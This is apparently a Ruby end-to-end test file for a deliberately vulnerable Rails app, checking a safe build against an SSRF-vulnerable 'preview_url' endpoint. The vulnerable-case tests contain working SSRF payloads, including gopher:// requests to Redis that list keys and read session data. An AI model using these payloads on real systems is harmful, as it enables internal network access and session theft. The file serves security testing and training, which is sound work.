# frozen_string_literal: true

require "test_helper"
require_relative "e2e_helper"

class SsrfTest < ActiveSupport::TestCase
  include E2EHelper

  setup do
    @safe_server = ServerPool.acquire(vuln_challenges: "")
    @vuln_server = ServerPool.acquire(vuln_challenges: "ssrf")
  end

  test "SAFE: preview_url endpoint does not exist" do
    result = create_task_via_form(@safe_server, title: "SSRF safe test")
    cookie = result[:cookie]
    task_id = result[:id]

    res = @safe_server.post(
      "/tasks/#{task_id}/preview_url",
      body: URI.encode_www_form("url" => "http://127.0.0.1:#{@safe_server.port}/up"),
      headers: { "Cookie" => cookie }
    )

    assert_equal "404", res.code, "SAFE: preview_url ルートは存在しないはず"
  end

  test "VULN: fetches internal HTTP URL without validation" do
    result = create_task_via_form(@vuln_server, title: "SSRF vuln test")
    cookie = result[:cookie]
    task_id = result[:id]

    # タスク詳細ページから CSRF トークンを取得
    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
    csrf_token = extract_csrf_token(res_show.body)

    internal_url = "http://127.0.0.1:#{@vuln_server.port}/up"

    res = @vuln_server.post(
      "/tasks/#{task_id}/preview_url",
      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => internal_url),
      headers: { "Cookie" => cookie }
    )

    assert_equal "200", res.code, "VULN: preview_url は内部URLにアクセスできるはず"
    body = JSON.parse(res.body)
    assert body["body"].present?, "内部URLのレスポンスボディが返るはず"
    # Rails 8.1+ の /up は HTML (green background) を返す
    assert_match /OK|background-color: green/i, body["body"], "Rails ヘルスチェックの内容が漏洩するはず"
  end

  # 手動確認用: docker-compose 環境で Redis に gopher 経由で到達できることを検証する
  test "VULN: gopher scheme reaches Redis (manual, requires redis container)" do
    result = create_task_via_form(@vuln_server, title: "gopher test")
    cookie = result[:cookie]
    task_id = result[:id]

    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
    csrf_token = extract_csrf_token(res_show.body)

    # RESP: *1\r\n$4\r\nPING\r\n をURLエンコード
    gopher_url = "gopher://redis:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A"

    res = @vuln_server.post(
      "/tasks/#{task_id}/preview_url",
      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => gopher_url),
      headers: { "Cookie" => cookie }
    )

    body = JSON.parse(res.body)
    assert_includes body["body"].to_s, "+PONG", "Redis に到達して PONG が返るはず"
  end

  test "VULN: leaks session data from Redis via gopher" do
    # 1) ログインしてセッションを作成
    result = create_task_via_form(@vuln_server, title: "session leak test")
    cookie = result[:cookie]
    task_id = result[:id]
    
    # Cookie からセッションIDを抽出 (_session_id=...)
    session_id = cookie.match(/_session_id=([^;]+)/)&.captures&.first
    assert session_id.present?, "セッションIDが取得できるはず"

    # 2) SSRF で KEYS * を実行し、セッションキーを探す
    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
    csrf_token = extract_csrf_token(res_show.body)

    keys_url = "gopher://redis:6379/_KEYS%20%2A"
    res_keys = @vuln_server.post(
      "/tasks/#{task_id}/preview_url",
      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => keys_url),
      headers: { "Cookie" => cookie }
    )

    keys_body = JSON.parse(res_keys.body)["body"]
    # Redis のレスポンスからセッションキーをすべて抽出
    all_session_keys = keys_body.scan(/(_session_id:[^\\\r\n\s]+)/).flatten
    assert all_session_keys.any?, "Redis 内にセッションキーが存在するはず"

    # 3) 各キーを GET で取得し、ログイン済みセッションを探す
    found_leaked_data = false
    all_session_keys.each do |key|
      encoded_key = ERB::Util.url_encode(key)
      get_url = "gopher://redis:6379/_GET%20#{encoded_key}%0D%0A"
      res_get = @vuln_server.post(
        "/tasks/#{task_id}/preview_url",
        body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
        headers: { "Cookie" => cookie }
      )

      fetched_body = JSON.parse(res_get.body)["body"]
      # Marshall 形式のデータ内に user_id か _csrf_token が含まれているか確認
      if fetched_body =~ /user_id|_csrf_token/i
        found_leaked_data = true
        break
      end
    end

    assert found_leaked_data, "リークしたデータにセッション情報 (user_id 等) が含まれるはず"
    end    end

